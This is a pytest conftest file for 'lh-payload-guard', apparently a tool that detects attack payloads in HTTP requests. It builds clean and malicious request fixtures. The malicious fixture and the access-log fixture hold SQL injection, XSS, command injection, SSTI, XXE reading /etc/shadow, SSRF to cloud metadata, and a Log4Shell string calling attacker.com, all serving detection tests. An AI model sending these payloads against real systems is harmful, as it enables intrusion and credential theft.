# ==============================================================================
# Product:       lh-payload-guard (lh-payload)
# Module:        tests.conftest
# Role:          Test Suite & Rule Verification
# Organization:  Logihertz Systems (OPC) Private Limited (logihertzsystems)
# Creator:       Sameer Tawade (Creator, Founder, Director & Whole and Sole Developer)
# Contact:       ops@logihertz.com | https://logihertz.com/
# License:       Apache License 2.0 (SPDX-License-Identifier: Apache-2.0)
# ==============================================================================

"""Shared test fixtures for lh-payload-guard test suite."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
import yaml


@pytest.fixture
def sample_clean_json(tmp_path: Path) -> Path:
    """Fixture providing benign HTTP requests in JSON format."""
    file_path = tmp_path / "clean_requests.json"
    data = [
        {
            "id": "req-101",
            "timestamp": "2026-11-01T10:00:00Z",
            "client_ip": "203.0.113.15",
            "method": "GET",
            "path": "/products/search",
            "query": {"q": "wireless keyboard", "page": "2", "limit": "20"},
            "headers": {"User-Agent": "Mozilla/5.0 Chrome/125.0", "Accept": "application/json"},
            "cookies": {"session_id": "sess_abc123"},
            "body": "",
        },
        {
            "id": "req-102",
            "timestamp": "2026-11-01T10:05:00Z",
            "client_ip": "198.51.100.40",
            "method": "POST",
            "path": "/api/v1/feedback",
            "headers": {"Content-Type": "application/json"},
            "body": {"rating": 5, "comment": "Great product and swift delivery!"},
        },
    ]
    file_path.write_text(json.dumps(data, indent=2), encoding="utf-8")
    return file_path


@pytest.fixture
def sample_malicious_json(tmp_path: Path) -> Path:
    """Fixture providing malicious payloads triggering complete rule catalog."""
    file_path = tmp_path / "malicious_payloads.json"
    data = [
        # LH-PAY-001: SQLi in query parameter
        {
            "id": "sqli-01",
            "method": "GET",
            "path": "/users",
            "query": {"id": "1' UNION SELECT username, password FROM users-- "},  # nosec B105
        },
        # LH-PAY-002: XSS in query
        {
            "id": "xss-01",
            "method": "GET",
            "path": "/profile",
            "query": {"bio": "<script>alert('pwned')</script>"},
        },
        # LH-PAY-003: Command injection in body
        {
            "id": "rce-01",
            "method": "POST",
            "path": "/admin/ping",
            "body": {"host": "127.0.0.1; whoami"},
        },
        # LH-PAY-004: SSTI in body
        {
            "id": "ssti-01",
            "method": "POST",
            "path": "/render",
            "body": {"template": "Hello {{7*7}} __class__.__mro__"},
        },
        # LH-PAY-005: Path traversal in query
        {
            "id": "lfi-01",
            "method": "GET",
            "path": "/download",
            "query": {"file": "../../../../etc/passwd"},
        },
        # LH-PAY-006: Log4Shell in User-Agent header
        {
            "id": "jndi-01",
            "method": "GET",
            "path": "/login",
            "headers": {"User-Agent": "${jndi:ldap://attacker.com/exploit}"},
        },
        # LH-PAY-007: XXE in body & NoSQLi in query
        {
            "id": "xxe-01",
            "method": "POST",
            "path": "/xml/upload",
            "body": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
        },
        # LH-PAY-008: SSRF loopback in callback query
        {
            "id": "ssrf-01",
            "method": "GET",
            "path": "/proxy",
            "query": {"url": "http://169.254.169.254/latest/meta-data/"},
        },
        # LH-PAY-009: CRLF splitting in header
        {
            "id": "crlf-01",
            "method": "GET",
            "path": "/redirect",
            "headers": {"X-Custom": "test%0d%0aSet-Cookie: session=evil"},
        },
        # LH-PAY-010: Prototype pollution in body
        {
            "id": "proto-01",
            "method": "POST",
            "path": "/api/settings",
            "body": {"__proto__": {"isAdmin": True}},
        },
    ]
    file_path.write_text(json.dumps(data, indent=2), encoding="utf-8")
    return file_path


@pytest.fixture
def sample_clean_yaml(tmp_path: Path) -> Path:
    """Fixture providing clean requests in YAML format."""
    file_path = tmp_path / "clean_requests.yaml"
    data = [
        {
            "id": "yaml-01",
            "method": "GET",
            "path": "/healthz",
            "headers": {"Host": "example.com"},
        }
    ]
    file_path.write_text(yaml.safe_dump(data), encoding="utf-8")
    return file_path


@pytest.fixture
def sample_access_log(tmp_path: Path) -> Path:
    """Fixture providing access log with an injected request."""
    file_path = tmp_path / "access.log"
    content = (
        '192.0.2.1 - - [01/Nov/2026:10:00:00 +0000] "GET /items?cat=tech HTTP/1.1" 200 1204 '
        '"https://google.com" "Mozilla/5.0"\n'
        '192.0.2.2 - - [01/Nov/2026:10:05:00 +0000] "GET /search?q=1\'%20OR%201=1--%20 HTTP/1.1" '
        '200 450 "-" "sqlmap/1.6.0"\n'
    )
    file_path.write_text(content, encoding="utf-8")
    return file_path
